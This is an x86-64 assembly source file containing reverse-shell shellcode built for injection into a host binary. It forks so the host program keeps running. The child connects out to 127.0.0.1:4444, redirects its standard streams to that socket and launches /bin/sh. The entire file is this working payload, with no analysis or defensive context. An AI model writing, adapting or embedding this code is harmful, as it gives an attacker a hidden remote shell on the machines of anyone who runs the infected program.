BITS 64
global _start

section .text
_start:
                                ; Save original stack pointer 
    mov r12, rsp                ; Save rsp to a preserved register (r12)

                                ; Save all registers (ABI preservation)
    push rax
    push rbx
    push rcx
    push rdx
    push rsi
    push rdi
    push rbp
    push r8
    push r9
    push r10
    push r11

                                ; Fork to isolate shellcode execution
    mov rax, 57                 ; sys_fork
    syscall
    test rax, rax
    jnz parent                  ; Parent continues host execution

child_process:
                                ; socket syscall
                                ; int socket(int domain, int type, int protocol)
    mov rax, 41                 ; sys_socket
    mov rdi, 2                  ; AF_INET
    mov rsi, 1                  ; SOCK_STREAM
    mov rdx, 6                  ; IPPROTO_TCP
    syscall
    cmp rax, 0
    jl exit                     ; If socket fails, exit

                                ; Save socket file descriptor in rdi
    mov rdi, rax

                                ; connect syscall
                                ; int connect(int sockfd, const struct sockaddr *addr, socklen_t addrlen)
    mov rax, 42                 ; sys_connect
                                ; Build sockaddr_in structure on the stack
    xor rdx, rdx
    push rdx                    ; NULL padding
    push dword 0x0100007f       ; 127.0.0.1, ip address
    push word 0x5c11            ; port 4444, network byte order
    push word 2                 ; AF_INET
    mov rsi, rsp                ; Pointer to sockaddr_in structure
    mov rdx, 16                 ; Size of sockaddr_in
    syscall
    cmp rax, 0
    jl exit                     ; If connect fails, exit

                                ; dup2 syscall: int dup2(int oldfd, int newfd)
    mov rsi, 3                  ; Start with stderr (2), work down to stdin (0)
dup2_loop:
    dec rsi                     ; Decrement file descriptor (2 -> 1 -> 0)
    mov rax, 33                 ; sys_dup2
    syscall
    jnz dup2_loop               ; Loop until rsi is 0

                                ; execve syscall
                                ; int execve(const char *pathname, char *const argv[], char *const envp[])
    xor rax, rax
    push rax                    ; NULL terminator
    mov rbx, 0x68732f6e69622f2f ; "//bin/sh" in reverse byte order
    push rbx
    mov rdi, rsp                ; Pathname pointer

    push rax                    ; NULL terminator for argv
    push rdi                    ; Pointer to the string "//bin/sh"
    mov rsi, rsp                ; argv -> [pointer_to_string, NULL]
    xor rdx, rdx                ; envp ->NULL
    mov al, 59                  ; syscall, execve
    syscall

                                ; If execve fails, exit
exit:
    xor rax, rax
    mov al, 60                  ; sys_exit
    xor rdi, rdi
    syscall

parent:
                                ; Restore registers and continue host execution
    pop r11
    pop r10
    pop r9
    pop r8
    pop rbp
    pop rdi
    pop rsi
    pop rdx
    pop rcx
    pop rbx
    pop rax
    mov rsp, r12                ; restore stack pointer

